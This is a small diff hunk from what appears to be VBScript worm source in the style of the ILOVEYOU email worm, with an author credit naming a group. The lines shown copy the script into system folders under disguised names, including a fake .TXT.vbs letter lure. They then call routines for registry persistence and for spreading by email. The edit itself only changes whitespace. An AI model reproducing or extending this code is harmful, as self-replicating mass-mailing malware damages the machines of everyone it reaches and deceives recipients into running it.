@@ -22,7 +22,7 @@ rem by: master7720  /  master7720@mail.com  /  @imperial Group  /  LA
  Set c = fso.GetFile(WScript.ScriptFullName)
  c.Copy(dirsystem&"\MSKernel32.vbs")
  c.Copy(dirwin&"\Win32DLL.vbs")
-  c.Copy(dirsystem&"\HYDRA-SENT-YOU-A-LETTER.TXT.vbs")
+ c.Copy(dirsystem&"\HYDRA-SENT-YOU-A-LETTER.TXT.vbs")
  regruns()
  html()
  spreadtoemail()
